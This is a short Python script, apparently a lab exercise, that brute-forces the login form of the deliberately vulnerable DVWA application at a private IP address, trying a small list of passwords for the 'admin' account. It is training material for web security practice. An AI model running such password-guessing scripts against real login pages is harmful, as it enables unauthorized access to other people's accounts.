#!/usr/bin/env python

import requests

username = "admin"
login_data = {"username": username, "password": "", "Login": "submit"}
password_list = ["hi", "bye", "test", "password"]
for password in password_list:
    login_data["password"] = password
    response = requests.post("http://10.0.2.5/dvwa/login.php", data=login_data)
    if "Login failed" in response.content:
        continue
    else:
        print ("password for "+username+" is "+password)
        exit()
print("not Found")

